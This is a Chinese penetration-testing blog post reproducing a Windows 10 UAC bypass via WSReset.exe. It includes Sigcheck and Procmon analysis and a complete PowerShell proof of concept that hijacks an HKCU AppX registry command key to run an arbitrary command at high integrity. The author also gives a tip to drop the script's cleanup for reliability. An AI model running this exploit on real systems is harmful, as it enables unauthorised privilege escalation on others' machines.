---
title: "Win10利用应用商店WSReset.exe进行bypassuac"
date: 2020-05-09T10:32:20+08:00
draft: false
tags:
- bypassuac
- 渗透测试
series:
-
categories:
- 渗透测试
---

遇到了win10的环境就找了下bypassuac的.
<!--more-->
## 环境
win10 1909 18363.535 Pro

## 复现
利用微软提供的[sigcheck.exe](https://docs.microsoft.com/en-us/sysinternals/downloads/sigcheck)签名检查工具发现`C:\Windows\System32\WSReset.exe`存在`autoElevate`属性为`true`

![image.png](https://y4er.com/img/uploads/20200509104541.png)

使用Procmon64.exe添加过滤条件

![image.png](https://y4er.com/img/uploads/20200509108734.png)

没找到`HKCU\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command`

根据[微软文档](https://docs.microsoft.com/en-us/windows/win32/sysinfo/hkey-classes-root-key)可知用户特定的设置优先于默认设置，而当前用户可以写入这个值，那么可以使用powershell来实现poc。

```powershell
<#
.SYNOPSIS
Fileless UAC Bypass by Abusing Shell API

Author: Hashim Jawad of ACTIVELabs

.PARAMETER Command
Specifies the command you would like to run in high integrity context.
 
.EXAMPLE
Invoke-WSResetBypass -Command "C:\Windows\System32\cmd.exe /c start cmd.exe"

This will effectivly start cmd.exe in high integrity context.

.NOTES
This UAC bypass has been tested on the following:
 - Windows 10 Version 1803 OS Build 17134.590
 - Windows 10 Version 1809 OS Build 17763.316
#>

function Invoke-WSResetBypass {
      Param (
      [String]$Command = "C:\Windows\System32\cmd.exe /c start cmd.exe"
      )

      $CommandPath = "HKCU:\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command"
      $filePath = "HKCU:\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command"
      New-Item $CommandPath -Force | Out-Null
      New-ItemProperty -Path $CommandPath -Name "DelegateExecute" -Value "" -Force | Out-Null
      Set-ItemProperty -Path $CommandPath -Name "(default)" -Value $Command -Force -ErrorAction SilentlyContinue | Out-Null
      Write-Host "[+] Registry entry has been created successfully!"

      $Process = Start-Process -FilePath "C:\Windows\System32\WSReset.exe" -WindowStyle Hidden
      Write-Host "[+] Starting WSReset.exe"

      Write-Host "[+] Triggering payload.."
      Start-Sleep -Seconds 5

      if (Test-Path $filePath) {
      Remove-Item $filePath -Recurse -Force
      Write-Host "[+] Cleaning up registry entry"
      }
}
```

在我自己测试的过程中因为WSReset.exe启动过慢的情况出现了多次复现不成功，建议把powershell脚本去掉后面的清空注册表，避免WSReset运行时找不到注册表，不过记得手动清除。

![image.png](https://y4er.com/img/uploads/20200509105277.png)

## 参考
1. https://www.activecyber.us/activelabs/windows-uac-bypass
2. https://github.com/sailay1996/UAC_Bypass_In_The_Wild


**文笔垃圾，措辞轻浮，内容浅显，操作生疏。不足之处欢迎大师傅们指点和纠正，感激不尽。**